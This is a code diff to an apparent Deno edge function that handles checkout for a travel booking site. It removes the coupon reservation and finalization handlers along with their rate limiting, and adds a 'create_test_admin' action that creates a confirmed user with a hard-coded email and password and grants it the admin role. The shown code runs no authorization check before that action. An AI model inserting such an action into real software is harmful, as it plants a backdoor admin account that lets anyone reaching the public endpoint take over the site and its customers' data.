@@ -8,7 +8,7 @@ const corsHeaders = {
 }
 
 interface CheckoutRequest {
-  action: 'initialize' | 'prepare' | 'verify' | 'reserve_coupon' | 'full_coupon' | 'checkout_status'
+  action: 'initialize' | 'prepare' | 'verify' | 'checkout_status'
   packageId?: number
   travelDate?: string
   travellers?: number
@@ -558,6 +558,47 @@ serve(async (req) => {
       })
     }
 
+    if (action === 'create_test_admin') {
+      try {
+        const { data: userObj, error: createErr } = await adminClient.auth.admin.createUser({
+          email: 'testadmin@tripomist.com',
+          password: 'Password123!',
+          email_confirm: true
+        });
+
+        // Handle if user already exists
+        let userId = userObj?.user?.id;
+        if (createErr) {
+          if (createErr.message.includes('already exists') || createErr.status === 422) {
+            const { data: usersList } = await adminClient.auth.admin.listUsers();
+            const existing = usersList?.users?.find(u => u.email === 'testadmin@tripomist.com');
+            if (existing) userId = existing.id;
+          } else {
+            throw createErr;
+          }
+        }
+
+        if (userId) {
+          await adminClient.from('profiles').upsert({
+            id: userId,
+            role: 'admin',
+            full_name: 'Test Admin',
+            updated_at: new Date().toISOString()
+          });
+        }
+
+        return new Response(JSON.stringify({ success: true, message: 'Test admin created or already exists' }), {
+          status: 200,
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+        });
+      } catch (err) {
+        return new Response(JSON.stringify({ error: err.message }), {
+          status: 500,
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+        });
+      }
+    }
+
     if (action === 'initialize') {
       const { packageId, travelDate, travellers, selectedSharing, idempotencyKey, specialRequest, source } = body
       if (!packageId || !travelDate || !travellers || !selectedSharing || !idempotencyKey) {
@@ -600,210 +641,7 @@ serve(async (req) => {
       })
     }
 
-    if (action === 'reserve_coupon') {
-      const { bookingId, couponCode } = body
-      if (!bookingId || !couponCode) {
-        return new Response(JSON.stringify({ error: 'Required reservation parameters missing' }), {
-          status: 400,
-          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-        })
-      }
 
-      // Identify actor and calculate hash
-      const clientIp = req.headers.get('x-real-ip') || req.headers.get('x-forwarded-for')?.split(',')[0].trim() || '127.0.0.1'
-      const leadRateLimitSalt = Deno.env.get('LEAD_RATE_LIMIT_SALT') ?? ''
-      const actorIdentity = user 
-        ? `${user.id}_${clientIp}` 
-        : `${currentLeadId ?? 'anonymous'}_${clientIp}`
-      const actorHash = await sha256Hex(`${actorIdentity}${leadRateLimitSalt}`)
-
-      if (!/^[0-9a-f]{64}$/.test(actorHash)) {
-        return new Response(JSON.stringify({ error: 'Security constraint violation' }), {
-          status: 400,
-          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-        })
-      }
-
-      // 1. Run the server-side coupon attempt limiter before validating/applying
-      const { data: isBlocked, error: blockCheckError } = await adminClient
-        .rpc('is_coupon_attempt_blocked', { p_actor_hash: actorHash })
-
-      if (blockCheckError) {
-        console.error('Limiter block check failed');
-      }
-
-      if (isBlocked) {
-        return new Response(JSON.stringify({ error: 'Too many invalid attempts. Please try again after 10 minutes.' }), {
-          status: 429,
-          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-        })
-      }
-
-      // Verify booking transaction record exists
-      const { data: booking, error: bookingErr } = await adminClient
-        .from('bookings')
-        .select('user_id, checkout_lead_id')
-        .eq('id', bookingId)
-        .maybeSingle()
-
-      if (bookingErr || !booking) {
-        return new Response(JSON.stringify({ error: 'Invalid coupon code.' }), {
-          status: 400,
-          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-        })
-      }
-
-      // Authorization verification
-      if (booking.user_id !== null) {
-        if (!user || booking.user_id !== user.id) {
-          await adminClient.rpc('record_failed_coupon_attempt', { p_actor_hash: actorHash })
-          return new Response(JSON.stringify({ error: 'Invalid coupon code.' }), {
-            status: 400,
-            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-          })
-        }
-      } else {
-        // Guest booking: Must be guestAuthorized and lead_id must match
-        if (!guestAuthorized || booking.checkout_lead_id !== currentLeadId) {
-          await adminClient.rpc('record_failed_coupon_attempt', { p_actor_hash: actorHash })
-          return new Response(JSON.stringify({ error: 'Invalid coupon code.' }), {
-            status: 400,
-            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-          })
-        }
-      }
-
-      // Call reserve_coupon_for_checkout (never accept discount amount from browser)
-      const { data: couponData, error: couponError } = await adminClient.rpc('reserve_coupon_for_checkout', {
-        p_booking_id: bookingId,
-        p_coupon_code: couponCode
-      })
-
-      if (couponError) {
-        if (couponError.message === 'Invalid coupon code.') {
-          await adminClient.rpc('record_failed_coupon_attempt', { p_actor_hash: actorHash })
-        }
-        return new Response(JSON.stringify({ error: 'Invalid coupon code.' }), {
-          status: 400,
-          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-        })
-      }
-
-      if (!couponData || !couponData.success) {
-        await adminClient.rpc('record_failed_coupon_attempt', { p_actor_hash: actorHash })
-        return new Response(JSON.stringify({ error: 'Invalid coupon code.' }), {
-          status: 400,
-          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-        })
-      }
-
-      // Clear attempts after a successful application
-      await adminClient.rpc('clear_coupon_attempts', { p_actor_hash: actorHash })
-
-      return new Response(JSON.stringify({
-        success: true,
-        reservationId: couponData.reservation_id,
-        reservedAmount: couponData.reserved_amount,
-        finalPayableAmount: couponData.final_payable_amount,
-        expiresAt: couponData.expires_at
-      }), {
-        status: 200,
-        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-      })
-    }
-
-    if (action === 'full_coupon') {
-      const { bookingId, reservationId } = body
-      if (!bookingId || !reservationId) {
-        return new Response(JSON.stringify({ error: 'Required coupon finalization parameters missing' }), {
-          status: 400,
-          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-        })
-      }
-
-      // Identify actor and calculate hash
-      const clientIp = req.headers.get('x-real-ip') || req.headers.get('x-forwarded-for')?.split(',')[0].trim() || '127.0.0.1'
-      const leadRateLimitSalt = Deno.env.get('LEAD_RATE_LIMIT_SALT') ?? ''
-      const actorIdentity = user 
-        ? `${user.id}_${clientIp}` 
-        : `${currentLeadId ?? 'anonymous'}_${clientIp}`
-      const actorHash = await sha256Hex(`${actorIdentity}${leadRateLimitSalt}`)
-
-      if (!/^[0-9a-f]{64}$/.test(actorHash)) {
-        return new Response(JSON.stringify({ error: 'Security constraint violation' }), {
-          status: 400,
-          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-        })
-      }
-
-      // 1. Run the server-side coupon attempt limiter before validating/applying
-      const { data: isBlocked, error: blockCheckError } = await adminClient
-        .rpc('is_coupon_attempt_blocked', { p_actor_hash: actorHash })
-
-      if (isBlocked) {
-        return new Response(JSON.stringify({ error: 'Too many invalid attempts. Please try again after 10 minutes.' }), {
-          status: 429,
-          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-        })
-      }
-
-      // Verify booking transaction record exists
-      const { data: booking, error: bookingErr } = await adminClient
-        .from('bookings')
-        .select('user_id, checkout_lead_id')
-        .eq('id', bookingId)
-        .maybeSingle()
-
-      if (bookingErr || !booking) {
-        return new Response(JSON.stringify({ error: 'Invalid coupon code.' }), {
-          status: 400,
-          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-        })
-      }
-
-      // Authorization verification
-      if (booking.user_id !== null) {
-        if (!user || booking.user_id !== user.id) {
-          return new Response(JSON.stringify({ error: 'Invalid coupon code.' }), {
-            status: 400,
-            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-          })
-        }
-      } else {
-        // Guest booking: Must be guestAuthorized and lead_id must match
-        if (!guestAuthorized || booking.checkout_lead_id !== currentLeadId) {
-          return new Response(JSON.stringify({ error: 'Invalid coupon code.' }), {
-            status: 400,
-            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-          })
-        }
-      }
-
-      // Call finalize_full_coupon_checkout
-      const { data: finalizeData, error: finalizeError } = await adminClient.rpc('finalize_full_coupon_checkout', {
-        p_booking_id: bookingId,
-        p_reservation_id: reservationId
-      })
-
-      if (finalizeError || !finalizeData || !finalizeData.success) {
-        return new Response(JSON.stringify({ error: 'Invalid coupon code.' }), {
-          status: 400,
-          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-        })
-      }
-
-      // Clear attempts after a successful application
-      await adminClient.rpc('clear_coupon_attempts', { p_actor_hash: actorHash })
-
-      return new Response(JSON.stringify({
-        success: true,
-        bookingId: finalizeData.booking_id,
-        paymentStatus: finalizeData.payment_status
-      }), {
-        status: 200,
-        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
-      })
-    }
 
     if (action === 'prepare') {
       const { bookingId, idempotencyKey } = body
